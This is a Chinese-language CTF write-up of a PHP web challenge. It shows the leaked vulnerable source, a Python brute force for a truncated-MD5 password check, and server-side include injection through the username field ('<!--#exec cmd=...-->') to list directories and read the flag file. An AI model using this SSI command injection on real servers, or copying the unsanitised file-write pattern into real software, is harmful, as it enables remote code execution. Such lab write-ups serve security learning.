![](<./img/Pasted image 20221217203306.png>)

---
首页长这样

![](<./img/Pasted image 20221217203322.png>)

为什么两个框框的`placeholder`都是`username`啊喂==

猜密码没猜中，快进到下一步

---
使用`dirsearch`扫目录

![](<./img/Pasted image 20221217205515.png>)
```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```
这个`***`不会是手残把墨水滴💾上造成的吧QwQ

---
先绕过第一个`if`
```python
from hashlib import md5

i = 0
while True:
    if md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1':
        print(i)
        break
    i = i + 1
```

> 2020666

---
接下来服务端在`public`目录下面写入了一个随机名字的`shtml`文件

`[!] Header error ...`暗示要去看响应头

![](<./img/Pasted image 20221217213950.png>)

![](<./img/Pasted image 20221217214621.png>)

---
然后是`shtml`的[新知识](https://zh.wikipedia.org/zh-cn/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C)

总之就是可以利用这个
```
<!--#exec cmd="ls -l" -->
```
来执行命令

这里通过`username`注入
```shell
ls
```

![](<./img/Pasted image 20221217215146.png>)

```shell
ls ..
```

![](<./img/Pasted image 20221217215251.png>)

```shell
cat ../flag_990c66bf85a09c664f0b6741840499b2
```

![](<./img/Pasted image 20221217215409.png>)

#Web #PHP #HTTP #Header #RCE #SHTML #HTML #目录扫描 #md5 